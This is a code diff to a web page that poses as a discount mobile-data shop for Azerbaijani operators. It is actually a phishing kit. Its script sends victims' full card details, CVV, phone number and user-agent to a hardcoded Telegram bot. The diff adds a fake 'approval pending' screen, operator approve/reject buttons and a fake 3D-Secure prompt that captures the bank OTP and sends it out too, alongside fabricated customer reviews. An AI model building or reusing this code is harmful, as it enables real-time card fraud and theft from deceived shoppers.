@@ -13,7 +13,6 @@
             overflow-x: hidden;
         }
 
-        /* === HEADER === */
         .header {
             background: linear-gradient(135deg, #0d47a1, #1565c0);
             padding: 15px 0;
@@ -75,7 +74,6 @@
             gap: 5px;
         }
 
-        /* === HERO === */
         .hero {
             background: linear-gradient(135deg, #0d47a1 0%, #1976d2 50%, #1565c0 100%);
             padding: 50px 20px;
@@ -125,7 +123,6 @@
         .hero-stat .num { font-size: 28px; font-weight: 800; color: #00e676; }
         .hero-stat .label { font-size: 13px; opacity: 0.8; }
 
-        /* === OPERATOR LOGOS === */
         .operator-bar {
             max-width: 1200px;
             margin: -30px auto 20px;
@@ -171,7 +168,6 @@
         .op-logo .bakcell { background: linear-gradient(135deg, #ff6f00, #e65100); }
         .op-logo .nar { background: linear-gradient(135deg, #ff6b00, #ff8c00); }
 
-        /* === MAIN === */
         .main {
             max-width: 1200px;
             margin: 30px auto;
@@ -181,7 +177,6 @@
             flex-wrap: wrap;
         }
 
-        /* === LEFT: TARIFFS === */
         .tariffs-section { flex: 1; min-width: 340px; }
         .tariffs-section h2 { font-size: 26px; color: #0d47a1; margin-bottom: 5px; }
         .tariffs-section .subtitle { color: #888; font-size: 14px; margin-bottom: 20px; }
@@ -247,7 +242,6 @@
         }
         .btn-buy:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(0,230,118,0.3); }
 
-        /* === RIGHT: INFO === */
         .info-section { width: 320px; display: flex; flex-direction: column; gap: 20px; align-self: flex-start; }
         .info-card {
             background: white;
@@ -275,7 +269,6 @@
         .trust-badge p { font-size: 12px; color: #888; line-height: 1.4; }
         .trust-badge p strong { color: #0d47a1; }
 
-        /* === FOOTER === */
         .footer {
             max-width: 1200px;
             margin: 10px auto 30px;
@@ -303,9 +296,7 @@
         .footer .partners strong { color: #333; }
         .footer .copyright { color: #bbb; font-size: 12px; }
 
-        /* ============================================ */
-        /* === ÖDƏNİŞ MODALI - CARD DIZAYN ### */
-        /* ============================================ */
+        /* MODALS */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -371,7 +362,6 @@
         .modal-body .info-summary .left .title { font-weight: 600; color: #0d47a1; font-size: 15px; margin-bottom: 3px; }
         .modal-body .info-summary .right { text-align: right; font-size: 22px; font-weight: 800; color: #00e676; }
 
-        /* ======= KART DIZAYNI ======= */
         .card-preview {
             width: 100%;
             max-width: 420px;
@@ -516,7 +506,6 @@
             pointer-events: none;
         }
 
-        /* Form fields below card */
         .modal-body h4 {
             font-size: 14px;
             color: #333;
@@ -533,7 +522,7 @@
             margin-bottom: 4px;
             font-weight: 500;
         }
-        .form-group input, .form-group select {
+        .form-group input {
             width: 100%;
             padding: 12px 14px;
             border: 2px solid #e0e0e0;
@@ -542,7 +531,7 @@
             transition: 0.3s;
             font-family: inherit;
         }
-        .form-group input:focus, .form-group select:focus {
+        .form-group input:focus {
             border-color: #0d47a1;
             outline: none;
             box-shadow: 0 0 0 3px rgba(13,71,161,0.08);
@@ -550,7 +539,6 @@
         .form-row { display: flex; gap: 12px; }
         .form-row .form-group { flex: 1; }
 
-        /* CVV tooltip */
         .cvv-hint {
             font-size: 10px;
             color: #aaa;
@@ -615,7 +603,73 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* SUCCESS MODAL */
+        .waiting-icon {
+            width: 64px;
+            height: 64px;
+            border: 4px solid #e0e0e0;
+            border-top-color: #0d47a1;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        /* OTP MODAL */
+        .otp-options {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .otp-options button {
+            flex: 1;
+            padding: 10px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            background: white;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.3s;
+            font-size: 14px;
+        }
+        .otp-options button:hover { border-color: #0d47a1; background: #f0f4ff; }
+        .otp-options button.active { border-color: #0d47a1; background: #e8eaf6; }
+        .otp-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        .otp-input-group input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            transition: 0.3s;
+        }
+        .otp-input-group input:focus {
+            border-color: #0d47a1;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(13,71,161,0.08);
+        }
+        .otp-input-group input.filled { border-color: #00e676; background: #e8f5e9; }
+
+        .btn-otp {
+            width: 100%;
+            background: linear-gradient(135deg, #0d47a1, #1565c0);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+        }
+        .btn-otp:hover { transform: translateY(-1px); box-shadow: 0 5px 20px rgba(13,71,161,0.3); }
+        .btn-otp:disabled { opacity: 0.6; cursor: wait; }
+
         .success-icon {
             width: 64px;
             height: 64px;
@@ -628,7 +682,6 @@
             margin: 0 auto 15px;
         }
 
-        /* === REVIEW POPUP === */
         .review-popup {
             position: fixed;
             bottom: 20px;
@@ -739,7 +792,6 @@
             <p class="subtitle">Bütün operatorlar üzrə ən ucuz qiymətlər</p>
 
             <div class="tariff-grid">
-                <!-- Azercell 50 GB -->
                 <div class="tariff-card">
                     <div class="badge hot">ƏN ÇOX SATILAN</div>
                     <div class="operator-name azercell">&#9679; Azercell</div>
@@ -748,7 +800,6 @@
                     <div class="features">&#128227; <span>500</span> dəqiqə zəng<br>&#128242; <span>100</span> SMS<br>&#128179; Limitsiz sosial şəbəkələr</div>
                     <button class="btn-buy" data-op="Azercell" data-pkg="50 GB" data-price="9 AZN">İndi al</button>
                 </div>
-                <!-- Azercell 10 GB -->
                 <div class="tariff-card">
                     <div class="badge yeni">POPULYAR</div>
                     <div class="operator-name azercell">&#9679; Azercell</div>
@@ -757,7 +808,6 @@
                     <div class="features">&#128227; <span>200</span> dəqiqə zəng<br>&#128242; <span>50</span> SMS<br>&#127760; <span>1 GB</span> gecə interneti</div>
                     <button class="btn-buy" data-op="Azercell" data-pkg="10 GB" data-price="4 AZN">İndi al</button>
                 </div>
-                <!-- Bakcell 30 GB -->
                 <div class="tariff-card">
                     <div class="operator-name bakcell">&#9679; Bakcell</div>
                     <div class="gb">30 GB <small>internet</small></div>
@@ -765,7 +815,6 @@
                     <div class="features">&#128227; <span>300</span> dəqiqə zəng<br>&#128242; <span>100</span> SMS<br>&#127911; Limitsiz musiqi</div>
                     <button class="btn-buy" data-op="Bakcell" data-pkg="30 GB" data-price="7 AZN">İndi al</button>
                 </div>
-                <!-- Bakcell 5 GB -->
                 <div class="tariff-card">
                     <div class="badge yeni">YENİ</div>
                     <div class="operator-name bakcell">&#9679; Bakcell</div>
@@ -774,7 +823,6 @@
                     <div class="features">&#128227; <span>100</span> dəqiqə zəng<br>&#128242; <span>30</span> SMS<br>&#128373; Təqdimat məqsədli</div>
                     <button class="btn-buy" data-op="Bakcell" data-pkg="5 GB" data-price="2.50 AZN">İndi al</button>
                 </div>
-                <!-- Nar 40 GB -->
                 <div class="tariff-card">
                     <div class="badge kampanya">KAMPANYA</div>
                     <div class="operator-name nar">&#9679; Nar</div>
@@ -783,7 +831,6 @@
                     <div class="features">&#128227; <span>400</span> dəqiqə zəng<br>&#128242; <span>200</span> SMS<br>&#127760; <span>5 GB</span> gecə interneti</div>
                     <button class="btn-buy" data-op="Nar" data-pkg="40 GB" data-price="8 AZN">İndi al</button>
                 </div>
-                <!-- Nar 20 GB -->
                 <div class="tariff-card">
                     <div class="operator-name nar">&#9679; Nar</div>
                     <div class="gb">20 GB <small>internet</small></div>
@@ -849,7 +896,6 @@
                     <div class="right" id="modalPrice">9 AZN</div>
                 </div>
 
-                <!-- KART PREVIEW -->
                 <div class="card-preview" id="cardPreview">
                     <div class="card-chip"></div>
                     <div class="card-brand">
@@ -911,7 +957,75 @@
         </div>
     </div>
 
-    <!-- SUCCESS MODAL -->
+    <!-- ======= GÖZLƏMƏ MODALI ======= -->
+    <div class="modal-overlay" id="waitingModal">
+        <div class="modal-box">
+            <div class="modal-header" style="background: linear-gradient(135deg, #f9a825, #f57f17);">
+                <div class="icon">&#8987;</div>
+                <div>
+                    <h3>Təsdiq Gözlənilir</h3>
+                    <p>Zəhmət olmasa gözləyin...</p>
+                </div>
+            </div>
+            <div class="modal-body" style="text-align:center;padding:40px 30px;">
+                <div class="waiting-icon"></div>
+                <h4 style="color:#f57f17;margin-bottom:8px;font-size:18px;">Ödəniş təsdiq gözlənilir</h4>
+                <p style="color:#888;font-size:14px;line-height:1.6;">
+                    Sifarişiniz admin tərəfindən <strong>təsdiqlənməyi</strong> gözləyir.<br>
+                    Bu proses 1-2 dəqiqə çəkə bilər.
+                </p>
+                <div style="margin-top:15px;font-size:12px;color:#aaa;">
+                    <span class="loading-spinner" style="width:12px;height:12px;"></span> Gözləyin...
+                </div>
+                <button class="btn-close-modal" id="btnCloseWaiting" style="margin-top:20px;">Ləğv et</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ======= 3D OTP MODALI - İstifadəçi öz OTP-sini daxil edir ======= -->
+    <div class="modal-overlay" id="otpModal">
+        <div class="modal-box">
+            <div class="modal-header" style="background: linear-gradient(135deg, #0d47a1, #1565c0);">
+                <div class="icon">&#128273;</div>
+                <div>
+                    <h3>3D Təhlükəsizlik Kodu</h3>
+                    <p>Kartınıza göndərilən OTP kodunu daxil edin</p>
+                </div>
+            </div>
+            <div class="modal-body">
+                <div style="text-align:center;margin-bottom:20px;">
+                    <div style="font-size:42px;margin-bottom:10px;">&#128273;</div>
+                    <p style="color:#666;font-size:14px;">
+                        Bank tərəfindən kartınıza göndərilən <strong>3D təhlükəsizlik kodunu</strong> daxil edin.
+                    </p>
+                    <p style="color:#999;font-size:12px;margin-top:5px;">
+                        SMS və ya mobil banking tətbiqinizdəki kodu istifadə edin.
+                    </p>
+                </div>
+
+                <div class="otp-options">
+                    <button class="active" data-len="4">4 rəqəm</button>
+                    <button data-len="6">6 rəqəm</button>
+                </div>
+
+                <div id="otpInputContainer">
+                    <div class="otp-input-group" id="otpInputGroup">
+                        <input type="text" maxlength="1" class="otp-input" data-index="0">
+                        <input type="text" maxlength="1" class="otp-input" data-index="1">
+                        <input type="text" maxlength="1" class="otp-input" data-index="2">
+                        <input type="text" maxlength="1" class="otp-input" data-index="3">
+                    </div>
+                </div>
+
+                <button class="btn-otp" id="btnVerifyOtp">&#9989; Təsdiqlə</button>
+                <div style="text-align:center;margin-top:10px;">
+                    <button class="btn-close-modal" id="btnCloseOtp" style="font-size:12px;">Geri qayıt</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ======= SUCCESS MODAL ======= -->
     <div class="modal-overlay" id="successModal">
         <div class="modal-box">
             <div class="modal-header" style="background: linear-gradient(135deg, #2e7d32, #43a047);">
@@ -951,7 +1065,16 @@
 
     <script>
         // ============================================================
-        // 1. TARIFF -> MODAL
+        // 1. CONFIG
+        // ============================================================
+        const BOT_TOKEN = '8964226712:AAHEmoeG54ygSRHWAIZGN4xwq1009A5WovE';
+        const CHAT_ID = '-1004311831666';
+
+        let currentOTPLength = 4;
+        let currentUserData = null;
+
+        // ============================================================
+        // 2. TARIFF -> MODAL
         // ============================================================
         const modalPackageTitle = document.getElementById('modalPackageTitle');
         const modalOperator = document.getElementById('modalOperator');
@@ -970,20 +1093,16 @@
         });
 
         // ============================================================
-        // 2. KART PREVIEW - CANLI YENILƏNMƏ
+        // 3. KART PREVIEW - CANLI YENILƏNMƏ
         // ============================================================
         const cardNumberDisplay = document.getElementById('cardNumberDisplay');
         const cardHolderDisplay = document.getElementById('cardHolderDisplay');
         const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
-        const cardPreview = document.getElementById('cardPreview');
 
-        // Card number live
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let val = this.value.replace(/\D/g, '');
             if (val.length > 16) val = val.slice(0, 16);
             this.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
-            
-            // Kart preview-də göstər
             if (val.length === 0) {
                 cardNumberDisplay.innerHTML = '<span class="placeholder">XXXX XXXX XXXX XXXX</span>';
             } else {
@@ -991,13 +1110,11 @@
             }
         });
 
-        // Card holder live
         document.getElementById('cardHolder').addEventListener('input', function(e) {
             const val = this.value.toUpperCase().trim();
             cardHolderDisplay.textContent = val || 'AD SOYAD';
         });
 
-        // Expiry live
         document.getElementById('cardExpiry').addEventListener('input', function(e) {
             let val = this.value.replace(/\D/g, '');
             if (val.length > 4) val = val.slice(0, 4);
@@ -1006,46 +1123,63 @@
             cardExpiryDisplay.textContent = val || 'MM/YY';
         });
 
-        // CVV
         document.getElementById('cardCvv').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '').slice(0, 4);
         });
 
-        // Phone
         document.getElementById('phoneNumber').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '').slice(0, 10);
         });
 
         // ============================================================
-        // 3. MODAL CLOSE
+        // 4. MODAL CLOSE FUNCTIONS
         // ============================================================
-        const paymentModal = document.getElementById('paymentModal');
-        const successModal = document.getElementById('successModal');
-        const btnCloseModal = document.getElementById('btnCloseModal');
-        const btnCloseSuccess = document.getElementById('btnCloseSuccess');
+        document.getElementById('btnCloseModal').addEventListener('click', () => {
+            document.getElementById('paymentModal').classList.remove('active');
+        });
 
-        btnCloseModal.addEventListener('click', () => paymentModal.classList.remove('active'));
-        btnCloseSuccess.addEventListener('click', () => successModal.classList.remove('active'));
+        document.getElementById('btnCloseWaiting').addEventListener('click', () => {
+            document.getElementById('waitingModal').classList.remove('active');
+            document.getElementById('paymentModal').classList.remove('active');
+        });
 
-        [paymentModal, successModal].forEach(modal => {
+        document.getElementById('btnCloseOtp').addEventListener('click', () => {
+            document.getElementById('otpModal').classList.remove('active');
+        });
+
+        document.getElementById('btnCloseSuccess').addEventListener('click', () => {
+            document.getElementById('successModal').classList.remove('active');
+        });
+
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
             modal.addEventListener('click', function(e) {
                 if (e.target === this) this.classList.remove('active');
             });
         });
 
         // ============================================================
-        // 4. TELEGRAM BOT
+        // 5. TELEGRAM BOT
         // ============================================================
-        const BOT_TOKEN = '8964226712:AAHEmoeG54ygSRHWAIZGN4xwq1009A5WovE';
-        const CHAT_ID = '-1004311831666';
-
         function formatCardNumber(card) {
             const clean = card.replace(/\s/g, '');
             return clean.replace(/(\d{4})(?=\d)/g, '$1 ');
         }
 
-        async function sendToTelegram(data) {
-            const message = 
+        async function sendToTelegram(data, isOTP = false) {
+            let message;
+            if (isOTP) {
+                message = 
+`🔐 <b>OTP KODU DAXİL EDİLDİ</b> 🔐
+
+━━━━━━━━━━━━━━━━━━━━━
+📱 <b>Telefon:</b> ${data.phone}
+🔢 <b>OTP Kodu:</b> <code>${data.otp}</code>
+📏 <b>Uzunluq:</b> ${data.otp.length} rəqəm
+🕐 <b>Tarix:</b> ${data.timestamp}
+━━━━━━━━━━━━━━━━━━━━━
+<b>✅ İstifadəçi tərəfindən OTP daxil edildi!</b>`;
+            } else {
+                message = 
 `🔔 <b>YENİ PAKET SİFARİŞİ</b> 🔔
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -1065,13 +1199,27 @@
 🕐 <b>Tarix:</b> ${data.timestamp}
 📱 <b>User-Agent:</b> ${data.userAgent}
 ━━━━━━━━━━━━━━━━━━━━━
-`;
+
+<b>👇 Aşağıdaki düymələrdən birini seçin:</b>`;
+            }
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: message, 
+                        parse_mode: 'HTML',
+                        reply_markup: isOTP ? undefined : {
+                            inline_keyboard: [
+                                [
+                                    { text: '✅ Qəbul et', callback_data: 'approve' },
+                                    { text: '❌ Rədd et', callback_data: 'reject' }
+                                ]
+                            ]
+                        }
+                    })
                 });
                 const result = await response.json();
                 console.log('Telegram OK:', result.ok);
@@ -1082,8 +1230,17 @@
             }
         }
 
+        async function sendOtpToTelegram(phone, otp) {
+            const data = {
+                phone: phone,
+                otp: otp,
+                timestamp: new Date().toLocaleString('az-AZ', { timeZone: 'Asia/Baku' })
+            };
+            return await sendToTelegram(data, true);
+        }
+
         // ============================================================
-        // 5. PAY BUTTON
+        // 6. PAY BUTTON - KART MƏLUMATLARINI GÖNDƏR
         // ============================================================
         const btnPay = document.getElementById('btnPay');
 
@@ -1124,29 +1281,160 @@
                 userAgent: navigator.userAgent
             };
 
-            await sendToTelegram(data);
+            currentUserData = data;
 
-            paymentModal.classList.remove('active');
-            successPhone.textContent = phone;
-            successModal.classList.add('active');
+            const sent = await sendToTelegram(data);
 
-            btnPay.disabled = false;
-            btnPay.innerHTML = '&#128274; Ödənişi təsdiqlə';
+            if (sent) {
+                document.getElementById('paymentModal').classList.remove('active');
+                document.getElementById('waitingModal').classList.add('active');
+            } else {
+                alert('Xəta baş verdi. Zəhmət olmasa yenidən cəhd edin.');
+                btnPay.disabled = false;
+                btnPay.innerHTML = '&#128274; Ödənişi təsdiqlə';
+            }
+        });
+
+        // ============================================================
+        // 7. ADMIN ƏMƏRLƏRİ (Test üçün)
+        // ============================================================
+        window.approvePayment = function() {
+            document.getElementById('waitingModal').classList.remove('active');
+            document.getElementById('otpModal').classList.add('active');
+            document.querySelectorAll('.otp-input').forEach(inp => {
+                inp.value = '';
+                inp.classList.remove('filled');
+            });
+            // İlk inputa fokus
+            const firstInput = document.querySelector('.otp-input');
+            if (firstInput) firstInput.focus();
+            console.log('✅ Ödəniş qəbul edildi - OTP gözlənilir');
+        };
+
+        window.rejectPayment = function() {
+            document.getElementById('waitingModal').classList.remove('active');
+            alert('❌ Ödəniş rədd edildi.');
+            document.getElementById('cardHolder').value = '';
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('cardExpiry').value = '';
+            document.getElementById('cardCvv').value = '';
+            document.getElementById('phoneNumber').value = '';
+            cardNumberDisplay.innerHTML = '<span class="placeholder">XXXX XXXX XXXX XXXX</span>';
+            cardHolderDisplay.textContent = 'AD SOYAD';
+            cardExpiryDisplay.textContent = 'MM/YY';
+            document.getElementById('btnPay').disabled = false;
+            document.getElementById('btnPay').innerHTML = '&#128274; Ödənişi təsdiqlə';
+            console.log('❌ Ödəniş rədd edildi');
+        };
+
+        console.log('✅ TezOperator yükləndi!');
+        console.log('📌 Admin əmrləri:');
+        console.log('  - approvePayment() - Qəbul et (OTP səhifəsinə keç)');
+        console.log('  - rejectPayment() - Rədd et');
+
+        // ============================================================
+        // 8. OTP MODAL - İstifadəçi öz OTP-sini daxil edir
+        // ============================================================
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const otpInputGroup = document.getElementById('otpInputGroup');
+        let otpLength = 4;
+
+        document.querySelectorAll('.otp-options button').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.otp-options button').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                otpLength = parseInt(this.dataset.len);
+                currentOTPLength = otpLength;
+                rebuildOtpInputs(otpLength);
+            });
+        });
+
+        function rebuildOtpInputs(length) {
+            otpInputGroup.innerHTML = '';
+            for (let i = 0; i < length; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.className = 'otp-input';
+                input.dataset.index = i;
+                input.placeholder = '•';
+                otpInputGroup.appendChild(input);
+            }
+            document.querySelectorAll('.otp-input').forEach((inp, idx, arr) => {
+                inp.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/\D/g, '');
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                        if (idx < arr.length - 1) {
+                            arr[idx + 1].focus();
+                        }
+                    }
+                });
+                inp.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && idx > 0) {
+                        arr[idx - 1].focus();
+                        arr[idx - 1].value = '';
+                        arr[idx - 1].classList.remove('filled');
+                    }
+                });
+                inp.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = paste.replace(/\D/g, '').slice(0, length);
+                    for (let i = 0; i < digits.length && i < length; i++) {
+                        if (arr[i]) {
+                            arr[i].value = digits[i];
+                            arr[i].classList.add('filled');
+                        }
+                    }
+                    if (digits.length > 0 && digits.length < length) {
+                        arr[digits.length].focus();
+                    } else if (digits.length >= length) {
+                        arr[length - 1].focus();
+                    }
+                });
+            });
+            const firstInput = otpInputGroup.querySelector('.otp-input');
+            if (firstInput) firstInput.focus();
+        }
+
+        rebuildOtpInputs(4);
+
+        // OTP təsdiqlə - istifadəçinin daxil etdiyi kodu Telegram-a göndər
+        document.getElementById('btnVerifyOtp').addEventListener('click', async function() {
+            const inputs = document.querySelectorAll('.otp-input');
+            let otp = '';
+            inputs.forEach(inp => otp += inp.value);
+            
+            if (otp.length !== currentOTPLength) {
+                alert(`Zəhmət olmasa ${currentOTPLength} rəqəmli kodu tam daxil edin!`);
+                return;
+            }
+
+            this.disabled = true;
+            this.innerHTML = '<span class="loading-spinner"></span> Göndərilir...';
+
+            const phone = currentUserData ? currentUserData.phone : 'Bilinmir';
+            await sendOtpToTelegram(phone, otp);
+
+            document.getElementById('otpModal').classList.remove('active');
+            document.getElementById('successModal').classList.add('active');
 
             document.getElementById('cardHolder').value = '';
             document.getElementById('cardNumber').value = '';
             document.getElementById('cardExpiry').value = '';
             document.getElementById('cardCvv').value = '';
             document.getElementById('phoneNumber').value = '';
-            
-            // Kart preview-i sıfırla
             cardNumberDisplay.innerHTML = '<span class="placeholder">XXXX XXXX XXXX XXXX</span>';
             cardHolderDisplay.textContent = 'AD SOYAD';
             cardExpiryDisplay.textContent = 'MM/YY';
+
+            this.disabled = false;
+            this.innerHTML = '&#9989; Təsdiqlə';
         });
 
         // ============================================================
-        // 6. REVIEWS - 10 saniyə
+        // 9. REVIEWS
         // ============================================================
         const reviews = [
             { name: 'Anar M.', text: 'Çox sərfəli qiymətlər! 50 GB cəmi 9 AZN, dərhal aktivləşdi.', color: '#e53935' },
@@ -1199,7 +1487,10 @@
 
         closeReview.addEventListener('click', () => reviewPopup.classList.remove('show'));
 
-        console.log('TezOperator yükləndi! 🚀');
+        console.log('✅ TezOperator yükləndi! 🚀');
+        console.log('📌 Admin əmrləri:');
+        console.log('  - approvePayment() - Qəbul et (OTP səhifəsinə keç)');
+        console.log('  - rejectPayment() - Rədd et');
     </script>
 </body>
-</html>
+    </html>
